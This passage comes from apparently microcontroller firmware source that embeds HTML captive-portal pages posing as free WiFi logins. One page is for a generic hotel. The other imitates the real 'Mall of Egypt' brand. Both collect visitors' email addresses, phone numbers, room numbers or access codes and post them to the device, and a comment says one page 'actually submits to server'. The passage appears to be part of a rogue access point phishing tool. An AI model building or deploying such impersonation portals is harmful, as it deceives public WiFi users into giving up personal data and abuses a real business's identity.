        .container{max-width:400px;width:100%;background:#fff;border-radius:32px;overflow:hidden}
        .header{background:#1f3e42;padding:40px;text-align:center}
        .header h1{color:#fff;font-size:28px}
        .content{padding:32px}
        input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;font-size:16px}
        button{width:100%;padding:14px;background:#2c6e6b;color:white;border:none;border-radius:8px;font-weight:bold;cursor:pointer}
        button:hover{background:#1f524f}
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🏨 Hotel WiFi</h1>
        <p style="color:#ffdd99">Free Premium Access</p>
    </div>
    <div class="content">
        <form method="POST" action="/submit">
            <input type="email" name="email" placeholder="Email address" required>
            <input type="text" name="room" placeholder="Room number (optional)">
            <button type="submit">Connect to Internet</button>
        </form>
    </div>
</div>
</body>
</html>
)HTML";

// Simplified Mall of Egypt page - actually submits to server
const char SIMPLE_masr3[] PROGMEM = R"HTML(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mall of Egypt - Free WiFi</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:linear-gradient(145deg,#0a2b2e,#1a4a4f);font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
        .container{max-width:400px;width:100%;background:#fff;border-radius:48px;overflow:hidden}
        .header{background:linear-gradient(135deg,#c49a3c,#e8bc6a);padding:40px;text-align:center}
        .header h1{color:#1e2a2c;font-size:28px}
        .content{padding:32px}
        input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:60px;font-size:16px}
        button{width:100%;padding:14px;background:#c49a3c;color:#1e2a2c;border:none;border-radius:60px;font-weight:bold;cursor:pointer}
        button:hover{background:#d4aa4a}
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🛍️ MALL OF EGYPT</h1>
        <p>Premium Free WiFi</p>
    </div>
    <div class="content">
        <form method="POST" action="/submit">
            <input type="text" name="phone" placeholder="Phone number or email" required>
            <input type="text" name="code" placeholder="Access code (optional)">
            <button type="submit">Connect to WiFi</button>
        </form>
    </div>
</div>
</body>
</html>
)HTML";